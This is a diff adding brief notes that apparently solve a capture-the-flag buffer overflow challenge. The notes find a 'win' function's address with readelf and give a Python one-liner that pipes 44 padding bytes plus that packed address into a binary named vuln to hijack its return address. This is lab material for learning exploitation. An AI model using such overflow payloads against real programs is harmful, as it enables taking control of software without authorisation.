@@ -1,0 +1,11 @@
+0x080485cb # win function
+
+readlef -s vuln # to see where win function is
+readelf -s vuln | grep "win"
+080485cb
+
+
+use struct module python to convert to little endian
+
+# had to guess a bunch to determine how many "As" to add.
+python -c "import struct; print 'A'*44 + struct.pack('<I', 0x080485cb)" | ./vuln
